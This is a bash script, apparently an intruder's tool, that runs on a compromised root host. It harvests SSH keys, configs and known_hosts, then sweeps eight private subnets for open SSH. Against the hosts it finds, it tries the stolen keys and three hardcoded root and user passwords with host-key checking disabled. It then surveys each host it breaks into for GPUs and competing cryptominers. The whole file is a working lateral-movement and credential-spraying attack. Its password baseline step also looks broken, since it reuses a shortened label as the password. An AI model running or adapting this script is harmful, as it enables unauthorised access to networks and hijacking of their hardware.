#!/bin/bash
# farmfanout1: harvest /root/conf toolkit + private-net reachability + bounded key/password ladder + GPU baseline
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
D=/root/ul_farmfan; mkdir -p $D
log(){ echo "$@"; }
log "### START $(date -u +%FT%TZ)"
log "### ID"; id; hostname; uname -a; cat /etc/machine-id 2>/dev/null
log "### IP"; ip -br a 2>/dev/null; echo '--- route'; ip r 2>/dev/null
log "### HOSTS"; cat /etc/hosts
log "### CONFIG-TREE"; find /root/conf -maxdepth 2 2>/dev/null | head -250
for d in /root/conf/*/; do [ -d "$d" ] && { log "[dir $d]"; ls -la "$d"; }; done
log "### SCRIPTS"
for f in /root/conf/hostlist /root/conf/*.sh /root/conf/*.txt; do
  [ -f "$f" ] && { log "===== $f"; sed -n '1,120p' "$f"; }
done
log "### DATACONF"; ls -la /data/apps/conf 2>/dev/null; sed -n '1,200p' /data/apps/conf/hosts 2>/dev/null
log "### SSHDIR"; ls -la /root/.ssh/ 2>/dev/null; sed -n '1,80p' /root/.ssh/config 2>/dev/null
log "### KNOWN_HOSTS"; cut -d' ' -f1 /root/.ssh/known_hosts 2>/dev/null | tr ',' '\n' | sort -u | head -300
log "### GPU"; nvidia-smi -L 2>&1; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu --format=csv,noheader 2>&1
log "### MINERS"; ps -eo pid,args 2>/dev/null | grep -Ei 'krig|wildrig|peakminer|srbminer|xmrig' | grep -v grep | cut -c1-400 | head -20
log "### UNITS"; systemctl list-units --type=service --no-pager 2>/dev/null | grep -iE 'krig|prl|mine|cuda|nv-' | head -20
log "### CRON"; crontab -l 2>/dev/null | head -20
log "### KITFIND"; find /root /opt /usr/local/bin -maxdepth 3 \( -name 'krig*' -o -name 'wildrig*' -o -name 'peakminer*' -o -name 'SRBMiner*' -o -name 'xmrig*' \) 2>/dev/null | head -30
log "### KEYS"
for k in $(find /root/.ssh /home/*/.ssh /data/apps 2>/dev/null -maxdepth 3 -type f \( -name 'id_*' -o -name '*.pem' \) ! -name '*.pub' | head -20); do
  log "KEYFILE $k :: $(head -1 "$k" | cut -c1-50)"
done

log "### SWEEP"
python3 - <<'PY'
import socket, concurrent.futures
tasks=[]
for s in ["11.9.141","172.16.11","192.168.0","10.242.32","10.251.10","10.102.2","172.16.21","10.80.80"]:
    for i in range(1,255): tasks.append((f"{s}.{i}",22))
def chk(a):
    h,p=a
    try:
        s=socket.create_connection((h,p),1.5); s.close(); return h
    except Exception: return None
op=[]
with concurrent.futures.ThreadPoolExecutor(300) as ex:
    for r in ex.map(chk,tasks):
        if r: op.append(r); print("OPEN22",r,flush=True)
print("TOTAL_OPEN22",len(op),flush=True)
open('/root/ul_farmfan/open22.txt','w').write("\n".join(op)+"\n")
PY
sort -u /root/ul_farmfan/open22.txt -o /root/ul_farmfan/open22.txt 2>/dev/null
log "### OPEN22-LIST"; head -80 /root/ul_farmfan/open22.txt

cat > /tmp/ap.sh <<'EOA'
#!/bin/sh
printf '%s\n' "$ULPT"
EOA
chmod +x /tmp/ap.sh

try_pub(){
  local out rc
  out=$(timeout 12 ssh -n -i "$3" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 "$2@$1" 'echo OK; id -u; hostname' 2>&1); rc=$?
  echo "PUB $2@$1 key=$(basename $3) rc=$rc :: $(echo "$out" | tr '\n' '|' | cut -c1-160)"
  return $rc
}
try_pw(){
  local out rc
  out=$(timeout 14 env SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force ULPT="$3" setsid -w ssh -n -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 "$2@$1" 'echo OK; id -u; hostname' 2>&1); rc=$?
  echo "PW $2@$1 pwl=$(echo -n "$3" | sha256sum | cut -c1-8) rc=$rc :: $(echo "$out" | tr '\n' '|' | cut -c1-160)"
  return $rc
}

log "### LADDER"
: > $D/accept.txt
KEYS=$(find /root/.ssh /home/*/.ssh -maxdepth 2 -type f -name 'id_*' ! -name '*.pub' 2>/dev/null | head -4)
log "KEYSET: $KEYS"
n=0
while read -r h; do
  [ -z "$h" ] && continue
  n=$((n+1)); [ $n -gt 26 ] && { log "LADDER-CAP-REACHED"; break; }
  log "--- host $h"
  OK=0
  for k in $KEYS; do
    for u in root ubuntu kgzs; do
      if try_pub "$h" "$u" "$k"; then echo "ACCEPT $h $u pub $k" >> $D/accept.txt; OK=1; break 2; fi
      sleep 1
    done
  done
  if [ $OK -eq 0 ]; then
    if try_pw "$h" root 'Admin@123_para#!2024'; then echo "ACCEPT $h root pw Admin123para" >> $D/accept.txt; OK=1; fi
    if [ $OK -eq 0 ] && try_pw "$h" kgzs 'Kgzs@2024'; then echo "ACCEPT $h kgzs pw Kgzs2024" >> $D/accept.txt; OK=1; fi
    if [ $OK -eq 0 ] && try_pw "$h" root 'Bingxing.2026'; then echo "ACCEPT $h root pw Bingxing2026" >> $D/accept.txt; OK=1; fi
    [ $OK -eq 0 ] && log "NOAUTH $h"
  fi
done < /root/ul_farmfan/open22.txt
log "### ACCEPT"; cat $D/accept.txt 2>/dev/null

log "### BASELINE"
: > $D/base.txt
CMD='echo HOST=$(hostname); id -u; nvidia-smi -L 2>&1 | head -10; echo DEV=$(ls /dev/nvidia[0-9]* 2>/dev/null | wc -l); nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu --format=csv,noheader 2>&1 | head -10; ps -eo args 2>/dev/null | grep -Ei "krig|wildrig|peakminer|srbminer" | grep -v grep | cut -c1-300 | head -6; systemctl list-units --type=service --no-pager 2>/dev/null | grep -iE "krig|prl|mine" | head -5; crontab -l 2>/dev/null | grep -iE "krig|prl|mine" | head -5'
while IFS=' ' read -r tag h u m cred; do
  [ "$tag" != ACCEPT ] && continue
  log "--- baseline $h ($u via $m)"
  case "$m" in
    pub) R=$(timeout 45 ssh -n -i "$cred" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 "$u@$h" "$CMD" 2>&1);;
    pw)  R=$(timeout 45 env SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force ULPT="$cred" setsid -w ssh -n -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 "$u@$h" "$CMD" 2>&1);;
  esac
  { echo "===== $h $u $m"; echo "$R"; } | tee -a $D/base.txt
done < $D/accept.txt
log "### DONE $(date -u +%FT%TZ)"
